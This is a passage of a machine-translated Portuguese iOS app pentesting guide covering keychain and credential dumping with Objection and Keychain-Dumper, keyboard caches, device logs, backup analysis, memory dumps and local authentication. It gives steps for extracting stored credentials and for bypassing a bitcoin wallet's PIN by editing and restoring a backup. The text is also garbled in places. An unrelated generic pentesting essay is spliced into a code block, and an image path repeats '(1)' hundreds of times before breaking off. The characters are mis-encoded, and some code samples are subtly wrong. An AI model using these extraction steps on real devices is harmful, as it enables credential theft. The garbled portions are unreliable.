backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C √© uma linguagem de programa√ß√£o utilizada para desenvolver aplicativos iOS. Ela √© baseada na linguagem C e adiciona recursos de programa√ß√£o orientada a objetos. Neste guia, exploraremos t√©cnicas de pentesting para aplicativos iOS escritos em Objective-C.

## Configura√ß√£o do ambiente

Antes de come√ßar a pentestear aplicativos iOS escritos em Objective-C, voc√™ precisar√° configurar seu ambiente de desenvolvimento. Aqui est√£o os passos b√°sicos:

1. Instale o Xcode: O Xcode √© a IDE oficial da Apple para desenvolvimento de aplicativos iOS. Voc√™ pode baix√°-lo gratuitamente na App Store.

2. Configure um dispositivo iOS: Para testar aplicativos em um dispositivo real, voc√™ precisar√° configurar um dispositivo iOS. Conecte seu dispositivo ao computador e siga as instru√ß√µes para ativ√°-lo para desenvolvimento.

3. Crie um projeto: Abra o Xcode e crie um novo projeto iOS em Objective-C. Isso criar√° uma estrutura b√°sica para voc√™ come√ßar a desenvolver seu aplicativo.

## T√©cnicas de pentesting

Agora que voc√™ configurou seu ambiente de desenvolvimento, vamos explorar algumas t√©cnicas de pentesting para aplicativos iOS escritos em Objective-C. Aqui est√£o algumas √°reas-chave que voc√™ deve considerar ao realizar um pentest:

1. An√°lise de c√≥digo: Realize uma an√°lise est√°tica do c√≥digo-fonte do aplicativo para identificar vulnerabilidades de seguran√ßa. Procure por pr√°ticas inseguras de codifica√ß√£o, como uso inadequado de APIs, falta de valida√ß√£o de entrada e armazenamento inadequado de dados sens√≠veis.

2. Teste de autentica√ß√£o: Verifique se o aplicativo implementa corretamente a autentica√ß√£o do usu√°rio. Teste a for√ßa das senhas, verifique se h√° prote√ß√£o contra ataques de for√ßa bruta e verifique se n√£o h√° vazamento de informa√ß√µes confidenciais durante o processo de autentica√ß√£o.

3. Teste de autoriza√ß√£o: Verifique se o aplicativo implementa corretamente a autoriza√ß√£o do usu√°rio. Certifique-se de que os usu√°rios s√≥ tenham acesso √†s funcionalidades e dados apropriados para suas permiss√µes.

4. Teste de criptografia: Verifique se o aplicativo utiliza criptografia adequada para proteger dados sens√≠veis, como senhas e informa√ß√µes pessoais dos usu√°rios. Procure por implementa√ß√µes fracas de criptografia que possam ser exploradas por um atacante.

5. Teste de comunica√ß√£o: Verifique se o aplicativo utiliza canais de comunica√ß√£o seguros, como HTTPS, para proteger a transmiss√£o de dados sens√≠veis entre o aplicativo e o servidor.

6. Teste de armazenamento: Verifique se o aplicativo armazena dados sens√≠veis de forma segura no dispositivo. Procure por vulnerabilidades de armazenamento, como o armazenamento n√£o criptografado de informa√ß√µes confidenciais em arquivos ou bancos de dados locais.

7. Teste de sess√£o: Verifique se o aplicativo gerencia corretamente as sess√µes do usu√°rio. Certifique-se de que as sess√µes sejam encerradas corretamente ap√≥s um per√≠odo de inatividade e que n√£o haja vazamento de informa√ß√µes confidenciais entre sess√µes.

8. Teste de integra√ß√£o com servi√ßos externos: Verifique se o aplicativo integra-se corretamente com servi√ßos externos, como APIs de terceiros. Certifique-se de que as chamadas de API sejam seguras e que n√£o haja vazamento de informa√ß√µes confidenciais durante a integra√ß√£o.

## Conclus√£o

Pentestear aplicativos iOS escritos em Objective-C requer uma compreens√£o s√≥lida das t√©cnicas de hacking e das melhores pr√°ticas de seguran√ßa. Ao seguir as t√©cnicas de pentesting mencionadas neste guia, voc√™ poder√° identificar e corrigir vulnerabilidades de seguran√ßa em seus aplicativos iOS. Lembre-se sempre de obter permiss√£o do propriet√°rio do aplicativo antes de realizar qualquer teste de pentesting.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Isso define a imagem de fundo como `overlayImage.png` sempre que o aplicativo √© colocado em segundo plano. Isso impede vazamentos de dados sens√≠veis, pois `overlayImage.png` sempre substituir√° a visualiza√ß√£o atual.

### Keychain

Ferramentas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) podem ser usadas para extrair o keychain (o dispositivo deve estar com jailbreak).\
Voc√™ tamb√©m pode usar `ios keychain dump` do [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** √© a classe perfeita para **armazenar nome de usu√°rio e senha no keychain**. N√£o √© necess√°rio se preocupar com NSUserDefaults ou qualquer wrapper de keychain.\
Depois que o usu√°rio fizer login, voc√™ pode armazenar seu nome de usu√°rio e senha no keychain:
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Voc√™ pode usar o comando `ios nsurlcredentialstorage dump` do **Objection** para extrair essas informa√ß√µes sigilosas.

## Teclados Personalizados/Cache do Teclado

A partir do iOS 8.0, a Apple permite a instala√ß√£o de extens√µes personalizadas para o iOS, como teclados personalizados.\
Os teclados instalados podem ser gerenciados em **Configura√ß√µes** > **Geral** > **Teclado** > **Teclados**.\
Teclados personalizados podem ser usados para **capturar** as **teclas digitadas** e envi√°-las para o servidor do atacante. No entanto, observe que **teclados personalizados que requerem conectividade de rede ser√£o notificados ao usu√°rio**.\
Al√©m disso, o **usu√°rio pode alternar para um teclado diferente** (mais confi√°vel) **para inserir as credenciais**.

Al√©m disso, **aplicativos podem impedir que seus usu√°rios usem teclados personalizados** dentro do aplicativo (ou pelo menos em partes sens√≠veis do aplicativo).

{% hint style="warning" %}
Recomenda-se n√£o permitir teclados de terceiros se voc√™ considerar que os usu√°rios n√£o precisar√£o deles.
{% endhint %}

Observe que, devido √† corre√ß√£o autom√°tica e sugest√µes autom√°ticas, o teclado padr√£o do iOS capturar√° e armazenar√° cada palavra n√£o padr√£o em um arquivo de cache se o atributo **secureTextEntry** n√£o estiver definido como **true** ou se **autoCorrectionType** n√£o estiver definido como **UITextAutoCorrectionTypeNo**.

Por padr√£o, os teclados **armazenam esse cache** dentro do sandbox do aplicativo no arquivo `Library/Keyboard/{locale}-dynamic-text.dat` ou em `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. No entanto, pode estar salvando os dados em outro local.\
√â poss√≠vel redefinir o cache em _**Configura√ß√µes**_ > _**Geral**_ > _**Redefinir**_ > _**Redefinir Dicion√°rio do Teclado**_

{% hint style="info" %}
Portanto, **sempre verifique esses arquivos** e procure por poss√≠veis **informa√ß√µes sigilosas**.\
**Interceptar o tr√°fego de rede** √© outra maneira de verificar se o teclado personalizado est√° enviando as teclas digitadas para um servidor remoto.
{% endhint %}

O protocolo [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) √© usado para o cache do teclado. As classes UITextField, UITextView e UISearchBar suportam automaticamente esse protocolo e oferecem as seguintes propriedades:

* `var autocorrectionType: UITextAutocorrectionType` determina se a corre√ß√£o autom√°tica est√° ativada durante a digita√ß√£o. Quando a corre√ß√£o autom√°tica est√° ativada, o objeto de texto rastreia palavras desconhecidas e sugere substitui√ß√µes adequadas, substituindo automaticamente o texto digitado, a menos que o usu√°rio substitua a substitui√ß√£o. O valor padr√£o dessa propriedade √© `UITextAutocorrectionTypeDefault`, que, para a maioria dos m√©todos de entrada, ativa a corre√ß√£o autom√°tica.
* `var secureTextEntry: BOOL` determina se a c√≥pia de texto e o cache de texto est√£o desativados e oculta o texto digitado para `UITextField`. O valor padr√£o dessa propriedade √© `NO`.

**Para identificar esse comportamento no c√≥digo:**

* Procure por implementa√ß√µes semelhantes no c√≥digo-fonte, como
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Abra os arquivos xib e storyboard no `Interface Builder` do Xcode e verifique os estados de `Secure Text Entry` e `Correction` no `Attributes Inspector` para o objeto apropriado.

A aplica√ß√£o deve impedir o armazenamento em cache de informa√ß√µes sens√≠veis inseridas nos campos de texto. Voc√™ pode evitar o armazenamento em cache desabilitando-o programaticamente, usando a diretiva `textObject.autocorrectionType = UITextAutocorrectionTypeNo` nos UITextFields, UITextViews e UISearchBars desejados. Para dados que devem ser mascarados, como PINs e senhas, defina `textObject.secureTextEntry` como `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Registros**

As formas mais comuns de depurar c√≥digo √© usando logs, e o aplicativo **pode imprimir informa√ß√µes sens√≠veis nos logs**.\
Na vers√£o do iOS 6 e abaixo, os logs eram leg√≠veis para todos (um aplicativo malicioso poderia ler logs de outros aplicativos e extrair informa√ß√µes sens√≠veis de l√°). **Hoje em dia, os aplicativos s√≥ podem acessar seus pr√≥prios logs**.

No entanto, um **atacante** com **acesso f√≠sico** a um dispositivo **desbloqueado** pode conect√°-lo a um computador e **ler os logs** (observe que os logs gravados no disco por um aplicativo n√£o s√£o removidos se o aplicativo for desinstalado).

√â recomendado **navegar por todas as telas** do aplicativo e **interagir** com **todos** os elementos de interface do usu√°rio e **funcionalidades** e fornecer texto de entrada em todos os campos de texto e **revisar os logs** em busca de **informa√ß√µes** **sens√≠veis** expostas.

Use as seguintes palavras-chave para verificar o c√≥digo-fonte do aplicativo em busca de declara√ß√µes de log pr√©-definidas e personalizadas:

* Para fun√ß√µes pr√©-definidas e incorporadas:
* NSLog
* NSAssert
* NSCAssert
* fprintf
* Para fun√ß√µes personalizadas:
* Logging
* Logfile

**Monitorando Registros do Sistema**

Muitos aplicativos registram mensagens informativas (e potencialmente sens√≠veis) no registro do console. O registro tamb√©m cont√©m relat√≥rios de falhas e outras informa√ß√µes √∫teis.

Voc√™ pode usar estas ferramentas:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Voc√™ pode coletar logs do console atrav√©s da janela **Devices** do Xcode da seguinte forma:

1. Abra o Xcode.
2. Conecte seu dispositivo ao computador hospedeiro.
3. Escolha **Window** -> **Devices and Simulators**.
4. Clique no seu dispositivo iOS conectado na se√ß√£o esquerda da janela Devices.
5. Reproduza o problema.
6. Clique no bot√£o **Open Console** localizado na √°rea superior direita da janela Devices para visualizar os logs do console em uma janela separada.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Backups

O iOS inclui recursos de backup autom√°tico que criam c√≥pias dos dados armazenados no dispositivo. Voc√™ pode fazer **backups do iOS** a partir do seu computador host usando o iTunes (at√© o macOS Catalina) ou o Finder (a partir do macOS Catalina), ou atrav√©s do recurso de backup do iCloud. Em ambos os casos, o backup inclui quase todos os dados armazenados no dispositivo iOS, exceto dados altamente sens√≠veis, como informa√ß√µes do Apple Pay e configura√ß√µes do Touch ID.

Como o iOS faz backup de aplicativos instalados e seus dados, uma preocupa√ß√£o √≥bvia √© se os **dados sens√≠veis do usu√°rio** armazenados pelo aplicativo podem **vazar acidentalmente atrav√©s do backup**. Outra preocupa√ß√£o, embora menos √≥bvia, √© se as **configura√ß√µes de configura√ß√£o sens√≠veis usadas para proteger dados ou restringir a funcionalidade do aplicativo podem ser adulteradas para alterar o comportamento do aplicativo ap√≥s a restaura√ß√£o de um backup modificado**. Ambas as preocupa√ß√µes s√£o v√°lidas e essas vulnerabilidades t√™m se mostrado existentes em um grande n√∫mero de aplicativos hoje em dia.

Um backup de um dispositivo em que um aplicativo m√≥vel foi instalado incluir√° todos os subdiret√≥rios (exceto `Library/Caches/`) e arquivos no [diret√≥rio privado do aplicativo](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12).\
Portanto, **evite armazenar dados sens√≠veis em texto simples em qualquer um dos arquivos ou pastas que est√£o no diret√≥rio privado do aplicativo ou subdiret√≥rios**.

Embora todos os arquivos em `Documents/` e `Library/Application Support/` sejam sempre inclu√≠dos no backup por padr√£o, voc√™ pode [excluir arquivos do backup](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28) chamando `NSURL setResourceValue:forKey:error:` com a chave `NSURLIsExcludedFromBackupKey`.\
Voc√™ pode usar as propriedades do sistema de arquivos [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey) e [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey) para excluir arquivos e diret√≥rios de backups.

{% hint style="warning" %}
Portanto, ao verificar o backup de um aplicativo, verifique se **alguma informa√ß√£o sens√≠vel** √© acess√≠vel e se voc√™ pode **modificar algum comportamento sens√≠vel** do aplicativo **modificando alguma configura√ß√£o do backup** e restaurando o backup.
{% endhint %}

**Como testar**

Comece **criando um backup do dispositivo** (voc√™ pode fazer isso usando o Finder) e encontre onde o backup est√° armazenado. A documenta√ß√£o oficial da Apple ir√° ajud√°-lo a [localizar backups do seu iPhone, iPad e iPod touch](https://support.apple.com/en-us/HT204215).

Depois de encontrar o backup do dispositivo (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), voc√™ pode come√ßar a procurar informa√ß√µes sens√≠veis usando o grep, por exemplo, ou usando ferramentas como [iMazing](https://imazing.com)).

Para identificar se um backup est√° criptografado, voc√™ pode verificar a chave chamada "IsEncrypted" do arquivo "Manifest.plist", localizado na raiz do diret√≥rio de backup. O exemplo a seguir mostra uma configura√ß√£o que indica que o backup est√° criptografado:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Caso precise trabalhar com um backup criptografado, existem alguns scripts em Python no reposit√≥rio do GitHub da DinoSec, como **backup_tool.py** e **backup_passwd.py**, que servir√£o como um bom ponto de partida. No entanto, observe que eles podem n√£o funcionar com as vers√µes mais recentes do iTunes/Finder e podem precisar ser ajustados.

Voc√™ tamb√©m pode usar a ferramenta **iOSbackup** para ler e extrair facilmente arquivos de um backup do iOS protegido por senha.

**Como modificar o comportamento**

No aplicativo de carteira de bitcoin de c√≥digo aberto, Bither, voc√™ ver√° que √© poss√≠vel configurar um PIN para bloquear a interface do usu√°rio. Esse PIN √© armazenado no arquivo `net.bither.plist` dentro da **chave** **pin_code**. Se voc√™ limpar essa chave do plist no backup e restaurar o backup, poder√° acessar a carteira.

## Testando a Mem√≥ria em busca de Dados Sens√≠veis

Em algum momento, informa√ß√µes sens√≠veis ser√£o armazenadas na mem√≥ria. O objetivo √© garantir que essas informa√ß√µes sejam expostas pelo menor tempo poss√≠vel.

Para investigar a mem√≥ria de um aplicativo, primeiro crie um **dump de mem√≥ria**. Alternativamente, voc√™ pode **analisar a mem√≥ria em tempo real** com, por exemplo, um depurador. Independentemente do m√©todo que voc√™ usar, esse √© um processo propenso a erros, pois os dumps fornecem os dados deixados pelas fun√ß√µes executadas e voc√™ pode perder etapas cr√≠ticas. Al√©m disso, √© muito f√°cil ignorar dados durante a an√°lise, a menos que voc√™ conhe√ßa o formato ou o valor exato dos dados que est√° procurando. Por exemplo, se o aplicativo criptografa de acordo com uma chave sim√©trica gerada aleatoriamente, √© muito improv√°vel que voc√™ encontre a chave na mem√≥ria, a menos que encontre seu valor por outros meios.

**Recuperando e Analisando um Dump de Mem√≥ria**

Seja usando um dispositivo com jailbreak ou sem jailbreak, voc√™ pode fazer o dump da mem√≥ria do processo do aplicativo com o [objection](https://github.com/sensepost/objection) e o [Fridump](https://github.com/Nightbringer21/fridump).

Ap√≥s o dump da mem√≥ria (por exemplo, em um arquivo chamado "memory"), dependendo da natureza dos dados que voc√™ est√° procurando, voc√™ precisar√° de um conjunto de ferramentas diferentes para processar e analisar esse dump de mem√≥ria. Por exemplo, se voc√™ estiver focando em strings, pode ser suficiente executar o comando `strings` ou `rabin2 -zz` para extrair essas strings.
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Abra o arquivo `strings.txt` no seu editor favorito e analise-o para identificar informa√ß√µes sens√≠veis.

No entanto, se voc√™ deseja inspecionar outros tipos de dados, √© melhor usar o radare2 e suas capacidades de pesquisa. Consulte a ajuda do radare2 no comando de pesquisa (`/?`) para obter mais informa√ß√µes e uma lista de op√ß√µes. O seguinte mostra apenas um subconjunto delas:
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**An√°lise de Mem√≥ria em Tempo de Execu√ß√£o**

Usando o [**r2frida**](https://github.com/nowsecure/r2frida), voc√™ pode analisar e inspecionar a mem√≥ria do aplicativo enquanto ele est√° em execu√ß√£o, sem precisar fazer o dump dela. Por exemplo, voc√™ pode executar os comandos de pesquisa anteriores do r2frida e pesquisar a mem√≥ria por uma string, valores hexadecimais, etc. Ao fazer isso, lembre-se de adicionar uma barra invertida `\` antes do comando de pesquisa (e de qualquer outro comando espec√≠fico do r2frida) ap√≥s iniciar a sess√£o com `r2 frida://usb//<nome_do_seu_app>`.

## Criptografia Quebrada

### Processos de Gerenciamento de Chave Fracos

Alguns desenvolvedores salvam dados sens√≠veis no armazenamento local e os criptografam com uma chave codificada/prediz√≠vel no c√≥digo. Isso n√£o deve ser feito, pois a revers√£o pode permitir que os atacantes extraiam as informa√ß√µes confidenciais.

### Uso de Algoritmos Inseguros e/ou Obsoletos

Os desenvolvedores n√£o devem usar **algoritmos obsoletos** para realizar **verifica√ß√µes** de autoriza√ß√£o, **armazenar** ou **enviar** dados. Alguns desses algoritmos s√£o: RC4, MD4, MD5, SHA1... Se forem usados **hashes** para armazenar senhas, por exemplo, devem ser usados hashes **resistentes** a ataques de for√ßa bruta com sal.

### Verifica√ß√£o

As principais verifica√ß√µes a serem realizadas s√£o encontrar senhas/segredos **codificados** no c√≥digo ou se eles s√£o **previs√≠veis**, e se o c√≥digo est√° usando algum tipo de algoritmo de **criptografia** **fraco**.

√â interessante saber que voc√™ pode **monitorar** automaticamente algumas **bibliotecas de criptografia** usando o **objection** com:
```swift
ios monitor crypt
```
Para **mais informa√ß√µes** sobre APIs e bibliotecas criptogr√°ficas do iOS, acesse [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autentica√ß√£o Local

O testador deve estar ciente de que a **autentica√ß√£o local deve sempre ser aplicada em um ponto remoto** ou com base em uma primitiva criptogr√°fica. Os atacantes podem facilmente contornar a autentica√ß√£o local se nenhum dado for retornado do processo de autentica√ß√£o.

O [**framework de Autentica√ß√£o Local**](https://developer.apple.com/documentation/localauthentication) fornece um conjunto de APIs para os desenvolvedores estenderem um di√°logo de autentica√ß√£o para um usu√°rio. No contexto de conex√£o com um servi√ßo remoto, √© poss√≠vel (e recomendado) aproveitar o [keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) para implementar a autentica√ß√£o local.

O sensor de **identifica√ß√£o por impress√£o digital** √© operado pelo [coprocessador de seguran√ßa SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) e n√£o exp√µe os dados da impress√£o digital para outras partes do sistema. Al√©m do Touch ID, a Apple introduziu o _Face ID_: que permite a autentica√ß√£o com base no reconhecimento facial.

Os desenvolvedores t√™m duas op√ß√µes para incorporar a autentica√ß√£o do Touch ID/Face ID:

* `LocalAuthentication.framework` √© uma API de alto n√≠vel que pode ser usada para **autenticar o usu√°rio via Touch ID**. O aplicativo n√£o pode acessar nenhum dado associado √† impress√£o digital registrada e √© notificado apenas se a autentica√ß√£o foi bem-sucedida.
* `Security.framework` √© uma API de n√≠vel inferior para acessar [servi√ßos de keychain](https://developer.apple.com/documentation/security/keychain\_services). Essa √© uma op√ß√£o segura se o seu aplicativo precisar **proteger alguns dados secretos com autentica√ß√£o biom√©trica**, pois o controle de acesso √© gerenciado em n√≠vel de sistema e n√£o pode ser facilmente contornado. `Security.framework` possui uma API em C, mas existem v√°rias [bibliotecas de c√≥digo aberto dispon√≠veis](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), tornando o acesso ao keychain t√£o simples quanto ao NSUserDefaults.

{% hint style="danger" %}
Esteja ciente de que o uso do `LocalAuthentication.framework` ou do `Security.framework` pode ser contornado por um atacante, pois ele retorna apenas um valor booleano e nenhum dado para prosseguir. Veja [Don't touch me that way, por David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) para mais detalhes.
{% endhint %}

### Framework de Autentica√ß√£o Local

Os desenvolvedores podem exibir uma **solicita√ß√£o de autentica√ß√£o** utilizando a fun√ß√£o **`evaluatePolicy`** da classe **`LAContext`**. Duas pol√≠ticas dispon√≠veis definem formas aceit√°veis de autentica√ß√£o:

